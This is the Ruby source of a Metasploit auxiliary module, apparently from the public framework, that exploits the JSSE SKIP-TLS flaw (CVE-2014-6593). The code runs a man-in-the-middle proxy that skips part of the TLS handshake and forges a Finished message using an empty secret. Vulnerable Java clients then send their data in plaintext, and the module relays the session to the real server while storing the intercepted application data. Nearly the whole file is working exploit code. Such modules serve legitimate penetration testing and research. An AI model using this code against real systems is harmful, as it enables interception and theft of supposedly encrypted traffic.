##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'openssl'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report

  def initialize
    super(
      'Name'        => 'Java Secure Socket Extension (JSSE) SKIP-TLS MITM Proxy',
      'Description'    => %q{
        This module exploits an incomplete internal state distinction in Java Secure
        Socket Extension (JSSE) by impersonating the server and finishing the
        handshake before the peers have authenticated themselves and instantiated
        negotiated security parameters, resulting in a plaintext SSL/TLS session
        with the client. This plaintext SSL/TLS session is then proxied to the
        server using a second SSL/TLS session from the proxy to the server (or an
        alternate fake server) allowing the session to continue normally and
        plaintext application data transmitted between the peers to be saved. This
        module requires an active man-in-the-middle attack.
      },
      'Author'      =>
        [
          'Ramon de C Valle'
        ],
      'License' => MSF_LICENSE,
      'Actions'     =>
        [
          [ 'Service' ]
        ],
      'PassiveActions' =>
        [
          'Service'
        ],
      'DefaultAction'  => 'Service',
      'References' => [
        ['CVE', '2014-6593'],
        ['CWE', '372'],
        ['URL', 'https://www.smacktls.com/#skip'],
        ['URL', 'https://www.smacktls.com/smack.pdf'],
        ['URL', 'http://www.oracle.com/technetwork/topics/security/cpujan2015-1972971.html'],
        ['URL', 'https://www-304.ibm.com/support/docview.wss?uid=swg21695474']
      ],
      'DisclosureDate' => 'Jan 20 2015'
    )

    register_options(
      [
        OptString.new('FAKEHOST', [ false, 'The fake server address', nil]),
        OptString.new('FAKEPORT', [ false, 'The fake server port', 443]),
        OptString.new('HOST', [ true, 'The server address', nil]),
        OptString.new('PORT', [ true, 'The server port', 443]),
        OptString.new('SRVHOST', [ true, 'The proxy address', '0.0.0.0']),
        OptString.new('SRVPORT', [ true, 'The proxy port', 443])
      ])
  end

  def cleanup
    super
    return unless @proxy

    begin
      @proxy.deref if @proxy.kind_of?(Rex::Service)
      if @proxy.kind_of?(Rex::Socket)
        @proxy.close
        @proxy.stop
      end
      @proxy = nil
    rescue ::Exception
    end
  end

  def prf(secret, label, seed)
    if secret.empty?
      s1 = s2 = ''
    else
      length = ((secret.length * 1.0) / 2).ceil
      s1 = secret[0..(length - 1)]
      s2 = secret[(length - 1)..(secret.length - 1)]
    end

    hmac_md5 = OpenSSL::HMAC.digest(OpenSSL::Digest.new('md5'), s1, label + seed)
    hmac_sha = OpenSSL::HMAC.digest(OpenSSL::Digest.new('sha1'), s2, label + seed)

    hmac_md5 = OpenSSL::HMAC.digest(OpenSSL::Digest.new('md5'), s1, hmac_md5 + label + seed)
    hmac_sha = OpenSSL::HMAC.digest(OpenSSL::Digest.new('sha1'), s2, hmac_sha + label + seed)

    result = ''
    [hmac_md5.length, hmac_sha.length].max.times { |i| result << [(hmac_md5.getbyte(i) || 0) ^ (hmac_sha.getbyte(i) || 0)].pack('C') }
    result
  end

  def prf_sha256(secret, label, seed)
    hmac_hash = OpenSSL::HMAC.digest(OpenSSL::Digest.new('sha256'), secret, label + seed)
    OpenSSL::HMAC.digest(OpenSSL::Digest.new('sha256'), secret, hmac_hash + label + seed)
  end

  def run
    fake_host = datastore['FAKEHOST'] || datastore['HOST']
    fake_port = datastore['FAKEPORT'] || datastore['PORT']
    host = datastore['HOST']
    local_host = datastore['SRVHOST']
    local_port = datastore['SRVPORT']
    port = datastore['PORT']

    @proxy = Rex::Socket::TcpServer.create(
      'LocalHost' => local_host,
      'LocalPort' => local_port,
      'Context'   => {
        'Msf' => framework,
        'MsfExploit' => self
      }
    )
    print_status('Listening on %s:%d' % [local_host, local_port])

    thread_num = 0

    loop do
      framework.threads.spawn("Thread #{thread_num += 1}", false, @proxy.accept) do |client|
        add_socket(client)
        finished_sent = false
        handshake_messages = ''
        application_data = ''

        print_status('Accepted connection from %s:%d' % [client.peerhost, client.peerport])

        fake_server = Rex::Socket::Tcp.create(
          'PeerHost' => fake_host,
          'PeerPort' => fake_port,
          'SSL'      => true,
          'SSLVerifyMode' => 'NONE',
          'Context'  =>
            {
              'Msf'        => framework,
              'MsfExploit' => self
            })
        add_socket(fake_server)

        print_status('Connected to %s:%d' % [fake_host, fake_port])

        server = Rex::Socket::Tcp.create(
          'PeerHost' => host,
          'PeerPort' => port,
          'Context'  =>
            {
              'Msf'        => framework,
              'MsfExploit' => self
            })
        add_socket(server)

        print_status('Connected to %s:%d' % [host, port])

        version = nil
        begin
          loop do
            readable, _, _ = Rex::ThreadSafe.select([client, server])

            readable.each do |r|
              case r
              when fake_server
                # The fake_server (i.e., server) is an SSL socket; Read
                # application data directly.
                header = ''
                fragment = r.get_once(4096)
              else
                header = r.get_once(5)
                raise EOFError if header.nil?
                fragment_length = header[3, 2].unpack('n')[0]
                fragment = ''
                while fragment_length > 0
                  partial_fragment = r.get_once(fragment_length)
                  fragment << partial_fragment
                  fragment_length = fragment_length - partial_fragment.length
                end
              end

              print_status('%d bytes received' % [header.length + fragment.length])

              # Drop the server hello done message and send the finished
              # message in plaintext.
              if fragment =~ /^\x0e\x00\x00\x00/
                if header[2, 1] == "\x03"
                  verify_data = prf_sha256('', 'server finished', OpenSSL::Digest::SHA256.digest(handshake_messages))
                  verify_data = verify_data[0, 12]
                else
                  verify_data = prf('', 'server finished', OpenSSL::Digest::MD5.digest(handshake_messages) + OpenSSL::Digest::SHA1.digest(handshake_messages))
                  verify_data = verify_data[0, 12]
                end

                finished = "\x14#{[verify_data.length].pack('N')[1, 3]}#{verify_data}"
                record = header[0, 3] + [finished.length].pack('n') + finished

                count = client.put(record)
                print_status('%d bytes sent' % [count])

                finished_sent = true

                # Change to the SSL socket connected to the same server or
                # to an alternate fake server.
                server.close
                server = fake_server

                # Save version used in the handshake
                version = header[2, 1]
                next
              else
                # Save handshake messages
                handshake_messages << fragment
              end unless finished_sent

              # Save application data
              application_data << fragment if finished_sent

              case r
              when client
                if finished_sent
                  # The server (i.e., fake_server) is an SSL socket
                  count = server.put(fragment)
                else
                  # The server isn't an SSL socket
                  count = server.put(header + fragment)
                end

                print_status('%d bytes sent' % [count])

              when fake_server
                # The client isn't an SSL socket; Add the record layer header
                # with the same version used in the handshake.
                header = "\x17\x03#{version}" + [fragment.length].pack('n')
                record = header + fragment
                count = client.put(record)
                print_status('%d bytes sent' % [count])

              when server
                record = header + fragment
                count = client.put(record)
                print_status('%d bytes sent' % [count])
              end
            end
          end

        rescue EOFError, Errno::ECONNRESET
          path = store_loot(
            'tls.application_data',
            'application/octet-stream',
            client.peerhost,
            application_data,
            'application_data',
            'TLS session application data'
          )

          print_good("SSL/TLS session application data successfully stored in #{path}")

          client.close
          fake_server.close
          server.close

          next
        end

        client.close
        fake_server.close
        server.close
      end
    end
  end
end
